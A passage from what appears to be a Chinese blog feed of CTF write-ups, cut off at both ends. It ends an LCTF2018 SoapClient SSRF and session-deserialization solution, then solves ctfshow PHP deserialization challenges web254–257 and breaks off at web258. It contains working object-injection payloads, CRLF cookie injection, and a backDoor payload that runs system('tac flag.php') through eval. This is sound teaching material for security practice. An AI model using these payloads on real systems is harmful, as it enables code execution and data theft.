markdown">|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A6%3A%22orange%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22<span class="hljs-emphasis">_stream_</span>context%22%3Bi%3A0%3Bs%3A11%3A%22<span class="hljs-emphasis">_user_</span>agent%22%3Bs%3A31%3A%22orange%0D%0ACookie%3APHPSESSID%3D123456%22%3Bs%3A13%3A%22<span class="hljs-emphasis">_soap_</span>version%22%3Bi%3A1%3B%7D<br></code></pre></td></tr></table></figure><p>给f传入<code>session_start</code>，post传入<code>serialize_handler=serialize</code>更改session序列化时候的引擎</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-10-27204433.png" alt="2024-10-27204433"></p><p>实现session伪造，然后调用extract函数变量覆盖题目的implode函数，使得再次调用call_user_func函数，构造出下面命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;SoapClient&quot;</span>,<span class="hljs-string">&quot;welcome_to_the_lctf2018&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-10-27204523.png" alt="2024-10-27204523"></p><p>最后回到index.php里面，改一下cookie</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-10-27204556.png" alt="2024-10-27204556"></p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-反序列化</title>
    <link href="/2024/10/26/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/10/26/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="web254"><a class="markdownIt-Anchor" href="#web254"></a> web254</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>观察一下代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=xxxxxx&amp;password=xxxxxx<br></code></pre></td></tr></table></figure><h2 id="web255"><a class="markdownIt-Anchor" href="#web255"></a> web255</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单构造一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D//cookie传值<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=xxxxxx&amp;password=xxxxxx<br></code></pre></td></tr></table></figure><h2 id="web256"><a class="markdownIt-Anchor" href="#web256"></a> web256</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!==<span class="hljs-variable language_">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;orange&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=orange&amp;password=xxxxxx<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22orange%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D<br></code></pre></td></tr></table></figure><h2 id="web257"><a class="markdownIt-Anchor" href="#web257"></a> web257</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__destruct</span>()</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$exp</span> =<span class="hljs-keyword">new</span> ctfShowUser;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=xxxxxx&amp;password=xxxxxx<br>user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27tac+flag.php%27%29%3B%22%3B%7D%7D<br></code></pre></td></tr></table></figure><h2 id="web258"><a class="markdownIt-Anchor" href="#web258"></a> web258</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 